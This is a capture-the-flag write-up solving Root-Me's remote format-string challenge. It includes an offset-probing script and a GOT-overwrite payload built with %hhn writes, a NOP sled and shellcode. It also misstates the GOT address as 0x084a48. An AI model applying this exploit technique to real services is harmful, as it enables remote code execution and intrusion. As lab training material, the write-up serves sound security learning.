# ELF x86 - Remote Format String bug
https://www.root-me.org/en/Challenges/App-System/ELF32-Remote-Format-String-bug
```
Environment configuration :
PIE 	Position Independent Executable 	 No
RelRO 	Read Only relocations 	                 No
NX 	Non-Executable Stack 	                 No
ASLR 	Address Space Layout Randomization 	 No
SF 	Source Fortification 	                 No
SSP 	Stack-Smashing Protection 	         No
SRC 	Source code access 	                 Yes

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	TCP
Port	        56032
SSH access 	ssh -p 2222 app-systeme-ch32@challenge02.root-me.org   
Username	app-systeme-ch32
Password	app-systeme-ch32
```
The vulnerable code is pretty obvious. It presented in the **recv_loop** function:
```c
recv(csock, input, LENGTH-1, 0);
snprintf (output, sizeof (output), input);
output[sizeof (output) - 1] = '\0';
send(csock, output, LENGTH-1, 0);
close(csock);
```
It's a format string vulnerability (as the title implies). So, we'll have to find few stuff before we'll be able to exploit it:
<ol>
  <li>The offset to the format string.</li>
  <li>A place to put our shellcode and it's address.</li>
  <li>An address that we'll overwrite with our shellcode's address.</li>
</ol>

**(1)** We can find out the offset pretty easily, with a small python script that will take leaverage of the '$'-flag:

```py
import socket

for i in xrange(1, 300):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('challenge02.root-me.org', 56032))

  exploit = 'AAAA%{0}$p'.format(i)
  s.send(exploit)
  print i, s.recv(1024)

  s.close()
```
After few seconds, this script will print ```5 AAAA0x41414141``` which indicates that there are 4 values in the stack before the format string.

**(2)** At the end of **recv_loop**, there is a call to _close_ for terminating the connection. Therefore, the we'll have to jump to our shellcode before the function ends.<br>
In order to so, we can overwrite the GOT entry of _close_. So, when it will try to close the socket, it will jump to our shellcode instead.
ASLR is not set, so we can find out the GOT entry's address using objdump:
```sh
objdump -R ./ch32

./ch32:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a058 R_386_COPY        __environ
0804a000 R_386_JUMP_SLOT   setsockopt
0804a004 R_386_JUMP_SLOT   printf
0804a008 R_386_JUMP_SLOT   wait
0804a00c R_386_JUMP_SLOT   htons
0804a010 R_386_JUMP_SLOT   perror
0804a014 R_386_JUMP_SLOT   accept
0804a018 R_386_JUMP_SLOT   getpid
0804a01c R_386_JUMP_SLOT   __gmon_start__
0804a020 R_386_JUMP_SLOT   exit
0804a024 R_386_JUMP_SLOT   __libc_start_main
0804a028 R_386_JUMP_SLOT   bind
0804a02c R_386_JUMP_SLOT   memset
0804a030 R_386_JUMP_SLOT   snprintf
0804a034 R_386_JUMP_SLOT   fork
0804a038 R_386_JUMP_SLOT   htonl
0804a03c R_386_JUMP_SLOT   listen
0804a040 R_386_JUMP_SLOT   socket
0804a044 R_386_JUMP_SLOT   recv
0804a048 R_386_JUMP_SLOT   close <-------------- HERE
0804a04c R_386_JUMP_SLOT   send
```
The address is 0x084a48.

**(3)** The challenge is a remote service. Therefore, we're not able to put the shellcode in an environment variable. Instead, we'll put it in the format string (NX is not set). Using gdb, one can find out that the address of the format string is around 0xbffff350. So in order to jump there successfully, we'll put the shellcode at the end of the format string with a NOP-sled. Let's try to jump to 0xbffff41c.

Now we're ready to build our exploit.<br>
first we'll put the addresses of all 4 bytes of the GOT entry:
```py
exploit = ''
exploit += struct.pack('I', CLOSE_PLT)
exploit += struct.pack('I', CLOSE_PLT + 1)
exploit += struct.pack('I', CLOSE_PLT + 2)
exploit += struct.pack('I', CLOSE_PLT + 3)
```
Now we'll write each one to it's wanted value, using the 'hnn'-flag and '%x' for padding:
```py
bytes = [0x00, 0x00, 0x00, 0x00]
bytes[0] = ((SHELLCODE_ADDRESS >> 0) & 0xff) - (len(bytes) * 4)
bytes[1] = ((SHELLCODE_ADDRESS >> 8) & 0xff) - (bytes[0] + len(bytes) * 4)
bytes[2] = ((SHELLCODE_ADDRESS >> 16) & 0xff) - (bytes[0] + bytes[1]  + len(bytes) * 4)
bytes[3] = ((SHELLCODE_ADDRESS >> 24) & 0xff) + 1

exploit += '%{0}x%{1}$hhn'.format(bytes[0], OFFSET)
exploit += '%{0}x%{1}$hhn'.format(bytes[1], OFFSET + 1)
exploit += '%{0}x%{1}$hhn'.format(bytes[2], OFFSET + 2)
exploit += '%{0}x%{1}$hhn'.format(bytes[3], OFFSET + 3)
```

And finally we'll add the NOP-sled and the shellcode to the format string:
```py
exploit += '\x90' * (BUFFER_LEN - len(exploit) - len(SHELLCODE))
exploit += SHELLCODE
```

So, after running the script (uploaded to this directory), the following output appears:
```sh
[!] Shellcode's length: 23.
[+] Starting communicating with the service.
[+] Preparing the exploit buffer with the shellcode.
[+] The buffer sent to the remote service.
[+] Flag: <censored>.
```
